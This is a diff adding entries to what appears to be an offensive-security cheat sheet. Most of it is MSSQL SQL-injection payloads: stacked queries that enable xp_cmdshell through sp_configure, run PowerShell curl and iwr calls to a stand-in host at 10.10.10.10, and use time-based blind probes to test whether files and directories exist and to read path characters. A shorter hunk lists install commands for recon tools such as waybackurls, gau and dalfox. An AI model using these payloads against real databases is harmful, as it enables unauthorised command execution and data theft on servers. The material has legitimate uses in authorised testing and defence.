@@ -380,6 +380,52 @@ union SELECT SYS.DATABASE_NAME,'b',1 FROM v$version--
 ' union SELECT USERNAME||':'||PASSWORD,'',1 FROM TABLE--
 
 [MSSQL]
+# Payload (Encounter Before)
+A';waitfor delay '0:0:00';--
+' OR 1=1 OR 'A' LIKE 'A
+';EXEC master..xp_cmdshell 'powershell.exe -c curl http://10.10.10.10/';--
+';EXEC master..xp_cmdshell 'powershell.exe -c iwr http://10.10.10.10/';--
+
+# Check File exist  or Not
+### Corect Path
+';DECLARE @isExists INT ;EXEC xp_fileexist 'C:\windows\win.ini', @isExists OUT Select @isExists;IF(@isExists=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
+
+### Wrong Path
+';DECLARE @isExists INT ;EXEC xp_fileexist 'C:\windows\win2.ini', @isExists OUT Select @isExists;IF(@isExists=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
+
+# Check Directory/Files Exist Or Not
+## Correct
+';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'IF EXIST "C:\windows\" (Exit 1) ELSE (Exit 0)',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
+
+## Wrong
+';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'IF EXIST "C:\windows2\" (Exit 1) ELSE (Exit 0)',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
+
+# Check Substring 
+## Correct
+';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(((Get-ChildItem -Path C:\ -Force -Directory)[0].fullName[0] -eq [char]67)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+
+## Wrong
+';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(((Get-ChildItem -Path C:\ -Force -Directory)[0].fullName[0] -eq [char]66)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+
+# Powershell IF ELSE
+';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF ("1" -eq "1") {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+
+';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF (1 -eq 1) {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+
+';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF (echo 1) {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+
+';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c IF ( Test-Path C:\ ) {EXIT 1} ELSE {EXIT 0}',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--  
+
+';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(Get-ChildItem -Path C:\){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+
+
+# Simple IF ELSE
+';DECLARE @value INT = 1;IF(@value=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
+
+# Payload (Enable xp_cmdshell)
+';sp_configure 'show advanced options', '1';RECONFIGURE;--
+';sp_configure 'xp_cmdshell', '1';RECONFIGURE;--
+
 ## Time Based
 ;waitfor delay '0:0:10'--
 );waitfor delay '0:0:10'--
@@ -1510,6 +1556,43 @@ OR
 
 # .Net Method References
 https://adsecurity.org/?p=113
+```
+
+### Waybackurls
+
+```bash
+# Install
+go get github.com/tomnomnom/waybackurls
+
+# Commands
+cat comain.txt| waybackurls > wayback.txt
+```
+
+### Gau
+
+```bash
+# Download
+GO111MODULE=on go get -u -v github.com/lc/gau
+
+# References
+https://github.com/lc/gau
+```
+
+### Assetfinder
+
+```bash
+# Download/Install
+sudo apt install assetfinder
+```
+
+### Dalfox
+
+```bash
+# Download/Install
+GO111MODULE=on go get -v github.com/hahwul/dalfox/v2
+
+# References
+https://github.com/hahwul/dalfox
 ```
 
 ### PowerUpSQL.ps1
